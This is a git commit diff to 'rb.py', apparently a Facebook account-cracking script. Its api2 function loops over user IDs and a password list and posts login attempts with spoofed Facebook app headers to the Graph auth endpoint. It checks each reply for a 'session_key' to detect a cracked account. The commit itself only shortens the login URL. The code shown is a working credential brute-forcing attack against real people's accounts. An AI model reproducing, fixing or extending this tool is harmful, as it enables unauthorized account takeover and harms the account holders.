c5d8d75ddb4d730bddcf9c0e55b95a7c9eae33b9
rbtesting2464 <132535016+rbtesting2464@users.noreply.github.com>
2023-06-06 10:29:38 +0545

    Update rb.py

--- rb.py
+++ rb.py
@@ -935,7 +935,7 @@ def api2(ids,names,passlist):
                                         'x-fb-friendly-name':'authenticate',
                                         'accept-encoding':'gzip, deflate',
                                         'x-fb-http-engine':     'Liger'}
-                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
+                                url = 'https://b-graph.facebook.com/auth/login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
@@ -1068,5 +1068,4 @@ except requests.exceptions.ConnectionError:
         exit()
 except Exception as e:pass
 menu()
-
 
